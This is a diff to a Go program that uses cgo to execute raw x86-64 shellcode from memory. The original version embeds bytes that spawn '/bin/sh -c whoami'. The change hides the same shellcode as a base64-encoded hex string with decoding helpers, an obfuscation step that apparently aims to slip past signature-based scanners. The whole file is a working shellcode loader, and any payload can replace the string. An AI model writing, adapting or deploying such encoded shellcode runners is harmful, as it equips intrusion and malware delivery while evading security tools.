@@ -22,8 +22,40 @@ void call(char *shellcode, size_t length) {
 */
 import "C"
 import (
+	"encoding/base64"
+	"strconv"
 	"unsafe"
 )
+
+
+// code->hex->base64
+var codeHere = "NmEzYjU4OTk0OGJiMmY2MjY5NmUyZjczNjgwMDUzNDg4OWU3NjgyZDYzMDAwMDQ4ODllNjUyZTgwNzAwMDAwMDc3Njg2ZjYxNmQ2OTAwNTY1NzQ4ODllNjBmMDU="
+
+func base2hex() string {
+	var encodeString = codeHere
+	decodeBytes, err := base64.StdEncoding.DecodeString(encodeString)
+	if err != nil {
+	}
+	return string(decodeBytes)
+}
+
+
+func hex2byteArr(strInput string)([]byte) {
+	strLength := len(strInput)
+	hexByte := make([]byte, len(strInput)/2)
+	ii := 0
+	for i := 0; i < len(strInput); i = i + 2 {
+		if strLength != 1 {
+			ss := string(strInput[i]) + string(strInput[i+1])
+			bt, _ := strconv.ParseInt(ss, 16, 32)
+			hexByte[ii] = byte(bt)
+			ii = ii + 1;
+			strLength = strLength - 2;
+		}
+	}
+	return hexByte;
+}
+
 
 func Run(sc []byte) {
 	C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
@@ -32,6 +64,6 @@ func Run(sc []byte) {
 
 func main() {
 	//执行命令whoami
-	sc := []byte("\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f\x05")
+	sc := hex2byteArr(base2hex())
 	Run(sc)
 }
